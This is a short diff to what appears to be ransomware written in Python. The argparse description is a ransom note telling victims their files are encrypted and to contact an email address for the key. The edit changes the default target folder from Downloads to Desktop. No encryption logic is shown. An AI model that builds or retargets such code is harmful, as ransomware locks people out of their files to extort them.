@@ -15,7 +15,7 @@ from dotenv import load_dotenv
 parser = argparse.ArgumentParser(description='Your files have been encrypted. Contact us (hacker@email.com) for further details and to get the decryption key.')
 parser.add_argument('-k', '--key', type=str, metavar='', help='add cryptographic key to decrypt the document')
 parser.add_argument('-b', '--backup', help='add cryptographic key to decrypt the document', action='store_true')
-parser.add_argument('-d', '--directory', type=str, metavar='', help='add cryptographic key to decrypt the document', default='Downloads')
+parser.add_argument('-d', '--directory', type=str, metavar='', help='add cryptographic key to decrypt the document', default='Desktop')
 args = parser.parse_args()
 
 ######################## FUNCTIONS ########################
